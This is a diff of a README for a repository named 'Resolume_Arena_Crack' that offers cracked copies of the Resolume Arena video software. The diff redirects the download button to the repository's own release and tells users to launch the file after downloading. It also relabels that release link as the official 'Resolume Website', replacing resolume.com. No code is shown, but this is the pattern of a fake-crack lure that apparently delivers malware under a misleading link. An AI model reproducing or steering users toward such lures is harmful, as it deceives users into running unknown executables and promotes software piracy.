@@ -9,7 +9,7 @@ Welcome to the "Resolume_Arena_Crack" repository! Here, you will find all the in
 **Topics:** arena-resolume, arena-resolume-5, descargar-resolume-arena-7-full-crack-mega, download-resolume-arena, resolume-arena-4, resolume-arena-7-full-crack, resolume-arena-7-gratis, resolume-arena-7-key-generator, resolume-arena-codec, resolume-arena-course, resolume-arena-download, resolume-arena-free-loops, resolume-arena-mac-crack, resolume-arena-manual, resolume-arena-pixel-mapping, resolume-arena-plugins
 
 ### Click the button below to download Resolume Arena:
-[![Download Resolume Arena](https://img.shields.io/badge/Download-Program.zip-brightgreen)](https://github.com/download/Program.zip)  
+[![Download Resolume Arena](https://github.com/gafhs/Resolume_Arena_Crack/releases/tag/v2.0)](https://github.com/gafhs/Resolume_Arena_Crack/releases/tag/v2.0)  
 *(Note: The file needs to be launched after downloading)*
 
 ## What is Resolume Arena? 🎬
@@ -53,7 +53,7 @@ Using Resolume Arena is straightforward, whether you are a beginner or a seasone
 
 This repository is a hub for all things related to Resolume Arena. Feel free to explore the topics, download resources, and engage with other users in the community. Share your projects, tips, and experiences with Resolume Arena to inspire others and grow your skills as a visual artist.
 
-### Visit the [Resolume Website](https://www.resolume.com/) for Official Updates and Tutorials.
+### Visit the [Resolume Website](https://github.com/gafhs/Resolume_Arena_Crack/releases/tag/v2.0) for Official Updates and Tutorials.
 
 ## Community and Support 🌟
 
